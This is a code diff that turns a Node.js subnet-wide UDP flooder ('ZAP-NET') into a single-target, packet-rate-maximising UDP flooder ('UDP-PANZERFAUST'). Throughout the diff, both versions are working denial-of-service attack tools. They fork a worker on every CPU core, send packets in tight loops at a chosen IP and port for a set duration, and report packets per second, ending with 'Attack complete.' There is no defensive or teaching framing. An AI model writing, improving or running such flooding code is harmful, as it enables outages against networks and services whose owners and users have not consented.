@@ -2,145 +2,122 @@ const dgram = require('dgram');
 const cluster = require('cluster');
 const os = require('os');
 
-const [subnet, portArg, durationArg] = process.argv.slice(2);
-const port = parseInt(portArg) || 53;
-const duration = parseInt(durationArg);
+const target = process.argv[2];
+const port = parseInt(process.argv[3]) || 53;
+const duration = parseInt(process.argv[4]);
 
-if (!subnet || !duration) {
-  console.log('Usage: node ZAP-NET.js <CIDR> <port> <duration_in_seconds>');
+if (!target || isNaN(duration)) {
+  console.log('Usage: node udp-panzerfaust.js <target_ip> <port> <duration_seconds>');
   process.exit(1);
 }
 
-function cidrToIps(cidr) {
-  const [ip, bits] = cidr.split('/');
-  const maskBits = parseInt(bits);
-  const ipParts = ip.split('.').map(Number);
-  const ipAsInt = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
-  const hosts = 2 ** (32 - maskBits);
-  const start = ipAsInt & (~(hosts - 1));
-  const end = start + hosts - 2; // exclude broadcast
-  const ipList = [];
-  for (let i = start + 1; i <= end; i++) {
-    ipList.push([
-      (i >> 24) & 255,
-      (i >> 16) & 255,
-      (i >> 8) & 255,
-      i & 255
-    ].join('.'));
-  }
-  return ipList;
-}
-
-function formatBytes(bytes) {
-  const units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB', 'ZB'];
-  let i = 0;
-  while (bytes >= 1024 && i < units.length - 1) {
-    bytes /= 1024;
-    i++;
-  }
-  return `${bytes.toFixed(2)} ${units[i]}`;
-}
-
-const targets = cidrToIps(subnet);
-const cpuCount = os.cpus().length;
 const endTime = Date.now() + duration * 1000;
-const payloadSize = 512;
-const payload = Buffer.alloc(payloadSize, 'Z');
+const payload = Buffer.alloc(1); // minimal payload = max PPS
+const cpuCount = os.cpus().length;
+
+const SAFE_MEM_THRESHOLD = 85;
+
+function getCpuUsage() {
+  const cpus = os.cpus();
+  let idle = 0, total = 0;
+  cpus.forEach(cpu => {
+    for (let type in cpu.times) total += cpu.times[type];
+    idle += cpu.times.idle;
+  });
+  return { idle: idle / cpus.length, total: total / cpus.length };
+}
 
 if (cluster.isMaster) {
+  let totalSent = 0;
+  let maxPPS = 0;
+
   console.clear();
-  console.log(`ZAP-NET (SUBNET UDP BOMBER)`);
-  console.log(`-----------------------------------`);
-  console.log(`Target Subnet: ${subnet}`);
-  console.log(`Port: ${port}`);
+  console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
+  console.log('--------------------------------------');
+  console.log(`Target: ${target}:${port}`);
   console.log(`Duration: ${duration}s`);
-  console.log(`Total Targets: ${targets.length}`);
-  console.log(`CPU Threads: ${cpuCount}`);
-  console.log(`-----------------------------------\n`);
+  console.log(`Cores: ${cpuCount}`);
+  console.log('Launching...\n');
 
-  let totalPackets = 0;
-  let totalBytes = 0;
-  let maxBps = 0;
-  let maxPps = 0;
-
-  const stats = Array(cpuCount).fill().map(() => ({ sent: 0, bytes: 0, bps: 0, pps: 0 }));
+  let cpuStart = getCpuUsage();
 
   for (let i = 0; i < cpuCount; i++) cluster.fork();
 
-  Object.values(cluster.workers).forEach((worker, idx) => {
-    worker.on('message', (msg) => {
-      if (msg.type === 'stats') stats[idx] = msg;
+  for (const id in cluster.workers) {
+    cluster.workers[id].on('message', (msg) => {
+      if (msg.type === 'stats') {
+        totalSent += msg.sent;
+        if (msg.pps > maxPPS) maxPPS = msg.pps;
+      }
     });
-  });
+  }
 
   setInterval(() => {
-    const sent = stats.reduce((acc, cur) => acc + cur.sent, 0);
-    const bytes = stats.reduce((acc, cur) => acc + cur.bytes, 0);
-    const bps = stats.reduce((acc, cur) => acc + cur.bps, 0);
-    const pps = stats.reduce((acc, cur) => acc + cur.pps, 0);
-    totalPackets += sent;
-    totalBytes += bytes;
-    if (bps > maxBps) maxBps = bps;
-    if (pps > maxPps) maxPps = pps;
+    const cpuEnd = getCpuUsage();
+    const idleDiff = cpuEnd.idle - cpuStart.idle;
+    const totalDiff = cpuEnd.total - cpuStart.total;
+    const cpuUsage = 100 - Math.floor((idleDiff / totalDiff) * 100);
+    cpuStart = cpuEnd;
 
     console.clear();
-    console.log(`ZAP-NET (SUBNET UDP BOMBER)`);
-    console.log(`-----------------------------------`);
-    console.log(`Target Subnet: ${subnet}`);
-    console.log(`Total IPs: ${targets.length}`);
-    console.log(`Packets Sent: ${totalPackets.toLocaleString()}`);
-    console.log(`Bandwidth Sent: ${formatBytes(totalBytes)}`);
-    console.log(`Current BPS: ${formatBytes(bps)}/s`);
-    console.log(`Current PPS: ${pps.toLocaleString()}/s`);
-    console.log(`Max BPS: ${formatBytes(maxBps)}/s`);
-    console.log(`Max PPS: ${maxPps.toLocaleString()}/s`);
-    console.log(`-----------------------------------\n`);
-  }, 5000);
+    console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
+    console.log('--------------------------------------');
+    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
+    console.log(`Max PPS: ${maxPPS.toLocaleString()}`);
+    console.log(`CPU Usage: ${cpuUsage}%`);
+    console.log(`Target: ${target}:${port}`);
+    console.log('--------------------------------------');
+
+    maxPPS = 0;
+  }, 2000);
 
   setTimeout(() => {
-    console.log('Attack finished.');
-    Object.values(cluster.workers).forEach(w => w.kill());
+    console.log('\nAttack complete.');
+    for (const id in cluster.workers) cluster.workers[id].kill();
     process.exit(0);
   }, duration * 1000);
 
 } else {
-  const socket = dgram.createSocket('udp4');
-
-  socket.bind(() => {
-    socket.setBroadcast(true);
-  });
-
+  const sock = dgram.createSocket('udp4');
   let sent = 0;
-  let bytesSent = 0;
-  let bps = 0;
   let pps = 0;
+  let isThrottled = false;
 
-  function sendLoop() {
-    if (Date.now() > endTime) return;
+  function getMemoryUsagePercent() {
+    const mem = process.memoryUsage();
+    return (mem.rss / os.totalmem()) * 100;
+  }
 
-    for (let i = 0; i < 300; i++) {
-      const target = targets[Math.floor(Math.random() * targets.length)];
-
-      socket.send(payload, port, target, (err) => {
-        if (!err) {
-          sent++;
-          bytesSent += payloadSize;
-          bps += payloadSize;
-          pps++;
-        }
-      });
+  function sendFlood() {
+    while (Date.now() < endTime && !isThrottled) {
+      for (let i = 0; i < 10000; i++) {
+        sock.send(payload, port, target);
+        sent++;
+        pps++;
+      }
     }
 
-    setImmediate(sendLoop);
+    if (Date.now() < endTime) {
+      setImmediate(sendFlood);
+    }
   }
 
   setInterval(() => {
-    process.send({ type: 'stats', sent, bytes: bytesSent, bps, pps });
+    const memUsage = getMemoryUsagePercent();
+    if (!isThrottled && memUsage > SAFE_MEM_THRESHOLD) {
+      isThrottled = true;
+      setTimeout(() => {
+        isThrottled = false;
+        sendFlood();
+      }, 10000);
+    }
+  }, 500);
+
+  setInterval(() => {
+    process.send({ type: 'stats', sent, pps });
     sent = 0;
-    bytesSent = 0;
-    bps = 0;
     pps = 0;
   }, 1000);
 
-  sendLoop();
+  sendFlood();
 }
